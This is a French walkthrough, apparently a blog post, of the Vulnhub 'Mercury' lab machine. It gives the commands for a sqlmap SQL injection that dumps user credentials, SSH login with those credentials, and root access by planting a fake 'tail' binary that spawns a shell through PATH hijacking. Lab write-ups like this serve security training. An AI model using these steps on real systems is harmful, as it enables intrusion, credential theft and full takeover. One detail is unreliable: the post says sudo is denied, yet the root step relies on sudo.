---
title: 'Mercury - Vulnhub'
description: "Mercury walkthrough de la série planets de Vulnhub"
pubDate: 'Aug 08 2025'
heroImage: '../../assets/mercury.jpg'
---

# Reconnaissance

## Scan Nmap
```bash
nmap -sV -p- 192.168.0.163
```
**Ports ouverts :**
- 22/tcp → SSH  
- 8080/tcp → HTTP (serveur web interne)

---

# Exploitation Web

## 1. Exploration du site
L’URL `http://192.168.0.163:8080/` ne renvoie qu’une page blanche.  
En testant des chemins aléatoires, on obtient systématiquement une erreur 404 mentionnant :

> Route : `/mercuryfacts/`

## 2. Injection SQL
Pointage de sqlmap sur cette route :

```bash
sqlmap -u "http://192.168.0.163:8080/mercuryfacts/" --dbs --batch
```
**Base de données identifiée :** `mercury`

Dump complet :

```bash
sqlmap -u "http://192.168.0.163:8080/mercuryfacts/" -D mercury --dump --batch
```
> Récupération d’une table `users` contenant des couples login / mot de passe (hashes ou clairs).

## 3. Connexion SSH
Connexion avec les identifiants collectés :

```bash
ssh webmaster@192.168.0.163
```

Vérification des droits sudo :
```bash
sudo -l
```
> Utilisateur non autorisé à exécuter sudo.

---

# Élévation de privilèges

## Analyse du script `check_syslog.sh`
Lors de l’audit, on découvre le script `/usr/bin/check_syslog.sh` exécuté régulièrement :

```bash
#!/bin/bash
tail -n 50 /var/log/syslog
```

**Observations :**
- Le binaire `tail` est appelé **sans chemin absolu**.
- Le script est lancé avec des privilèges plus élevés.

## Exploitation
1. Créer un faux binaire `tail` dans un dossier contrôlé :
   ```bash
   mkdir /tmp/evil
   cd /tmp/evil
   echo '#!/bin/bash' > tail
   echo '/bin/sh' >> tail
   chmod +x tail
   ``

2. Modifier la variable `PATH` :
   ```bash
   export PATH=/tmp/evil:$PATH
   ```

3. Relancer le script :
   ```bash
   sudo --preserve-env=PATH /usr/bin/check_syslog.sh
   ```

4. Vérification :
   ```bash
   whoami
   ```
   > root

Le contrôle total de la machine est acquis.